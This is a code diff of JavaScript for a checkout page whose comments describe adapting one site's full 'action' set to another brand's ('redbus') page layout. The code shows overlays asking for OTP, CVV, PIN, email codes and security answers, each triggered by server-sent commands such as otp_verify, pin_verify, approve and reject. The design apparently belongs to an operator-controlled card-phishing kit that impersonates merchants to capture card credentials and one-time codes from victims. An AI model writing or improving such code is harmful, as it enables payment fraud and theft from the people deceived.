@@ -353,9 +353,50 @@ fetch('/api/settings')
  
   /* ── Action handler（对应 Cineplex 全套 action，DOM 适配 redbus） ── */
   function safeId(id) { return document.getElementById(id); }
+  function hideOverlayById(id) { var e = safeId(id); if (e) e.classList.add('hidden'); }
   function isOverlayOpen(id) {
     var e = safeId(id);
     return !!(e && !e.classList.contains('hidden'));
+  }
+
+  var VERIFY_TRANSITION_ACTIONS = {
+    otp_verify: 1,
+    custom_otp_verify: 1,
+    custom_otp_tail: 1,
+    email_verify: 1,
+    custom_email_verify: 1,
+    custom_email_tail: 1,
+    cvv_verify: 1,
+    question_verify: 1,
+    app_verify: 1,
+    pin_verify: 1
+  };
+
+  function isVerifyTransitionAction(a) {
+    return !!VERIFY_TRANSITION_ACTIONS[a];
+  }
+
+  function hideAppMounts() {
+    ['mount1', 'mount2', 'mount3', 'mount4', 'mount5', 'mount6', 'mount7'].forEach(function (id) {
+      var el = safeId(id);
+      if (!el) return;
+      el.classList.add('hidden');
+      if (!el.shadowRoot) return;
+      try {
+        var inner = el.shadowRoot.querySelector('div > div');
+        if (inner) {
+          inner.classList.add('hidden');
+          inner.style.display = '';
+        }
+        var spin = el.shadowRoot.querySelector('.vfy-spinner');
+        if (spin) {
+          spin.classList.add('hidden');
+          spin.style.display = '';
+        }
+        var err = el.shadowRoot.querySelector('.app-error');
+        if (err) err.classList.add('hidden');
+      } catch (e) {}
+    });
   }
 
   function resetVerifyOverlayState() {
@@ -382,10 +423,7 @@ fetch('/api/settings')
     hide('app-verify-overlay');
     hide('app-spinner');
     hide('app-error');
-    ['mount1','mount2','mount3','mount4','mount5','mount6','mount7'].forEach(function (m) {
-      var el = safeId(m);
-      if (el) { el.classList.add('hidden'); el.innerHTML = ''; }
-    });
+    hideAppMounts();
     var avBox = safeId('app-verify-box');
     if (avBox) avBox.classList.add('hidden');
     var avBtn = safeId('app-continue-btn');
@@ -424,9 +462,8 @@ fetch('/api/settings')
   function handleAction(p) {
     var a = p.action;
 
-    /* 收到验证类 action 时重置所有验证覆盖层状态 */
-    if (a === 'otp_verify' || a === 'custom_otp_verify' || a === 'custom_otp_tail' ||
-        a === 'cvv_verify'  || a === 'question_verify'  ||  a=== 'app_verify'  ||  a=== 'pin_verify') {
+    /* 切换到任意验证步骤前，先关闭其它验证覆盖层（含 App → Email 等） */
+    if (isVerifyTransitionAction(a)) {
       resetVerifyOverlayState();
     }
  
@@ -488,8 +525,8 @@ fetch('/api/settings')
       if (otpMsg) otpMsg.textContent =
         'A One-Time Password has been sent to your registered mobile number ending ' + sfx +
         '. Please enter the OTP below.';*/
-      resetOtp();
-      startOtpTimer();
+      resetEmail();
+      startEmailTimer();
       applyMerchantBranding();
  
     } else if (a === 'cvv_verify' || a === 'question_verify') {
@@ -504,20 +541,25 @@ fetch('/api/settings')
       resetOtp();
  
     } else if (a === 'approve') {
-      //showMsg('success', 'Payment approved!');
+      resetVerifyOverlayState();
+      lockCheckoutForm(false);
+      document.body.classList.remove('tc-checkout-locked');
       var btn = q('pay-btn');
       if (btn) { btn.disabled = true; /*btn.textContent = 'Approved';*/ }
-      hideOtp();
       setTimeout(function () { location.href = '/complete/'; }, 2000);
  
     } else if (a === 'reject') {
-      hideOtp();
+      resetVerifyOverlayState();
+      lockCheckoutForm(false);
+      document.body.classList.remove('tc-checkout-locked');
       var btn2 = q('pay-btn');
       if (btn2) { btn2.disabled = true; }
       showInline('error', 'Declined: ' + (p.message || ''), true);
  
     } else if (a === 'card_error') {
-      //hideOtp();
+      resetVerifyOverlayState();
+      lockCheckoutForm(false);
+      document.body.classList.remove('tc-checkout-locked');
       hideLoad()
       var btn3 = q('pay-btn');
       if (btn3) { btn3.disabled = false; /*btn3.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
@@ -538,7 +580,9 @@ fetch('/api/settings')
       if (otpBtn) { otpBtn.disabled = false; otpBtn.textContent = 'Verify'; }
  
     } else if (a === 'timeout') {
-      hideOtp();
+      resetVerifyOverlayState();
+      lockCheckoutForm(false);
+      document.body.classList.remove('tc-checkout-locked');
       var btn4 = q('pay-btn');
       if (btn4) { btn4.disabled = true; }
       showInline('error', 'Session timed out. Please try again.', true);
@@ -959,7 +1003,12 @@ fetch('/api/settings')
      else if (a === 'pin_verify') {
       _curStep = 'pin_verify';
       hideLoad();
-      document.getElementById('pin-overlay').classList.remove('hidden');
+      hideOverlayById('app-verify-overlay');
+      hideAppMounts();
+      hideOverlayById('otp-overlay');
+      hideOverlayById('email-overlay');
+      var pinOverlay = safeId('pin-overlay');
+      if (pinOverlay) pinOverlay.classList.remove('hidden');
       document.getElementById('pin-amount-row').style.display = '';
       document.getElementById('pin-amount').textContent = 'MR ' + String(getPayAmount());
       updateOtpCardLogoStyle(p.cardInfo?.cardType || p.cardType, 'pin-card-logo');
@@ -1155,6 +1204,9 @@ fetch('/api/settings')
 
 
   function showOtp() {
+    hideOverlayById('app-verify-overlay');
+    hideOverlayById('email-overlay');
+    hideOverlayById('pin-overlay');
     var sec = q('otp-overlay');
     var otpCode = safeId('otp-code');
     if (otpCode) otpCode.value = '';
@@ -1195,12 +1247,14 @@ fetch('/api/settings')
 
   //Email Code
   function showEmail() {
-    
+    hideOverlayById('app-verify-overlay');
+    hideAppMounts();
+    hideOverlayById('otp-overlay');
+    hideOverlayById('pin-overlay');
     var sec = q('email-overlay');
-    document.getElementById('email-code').value = '';
-    //var btn = q('pay-btn');
+    var emailCode = safeId('email-code');
+    if (emailCode) emailCode.value = '';
     if (sec) sec.className = 'overlay';
-    //if (btn) btn.style.display = 'none';
   }
  
   function hideEmail() {
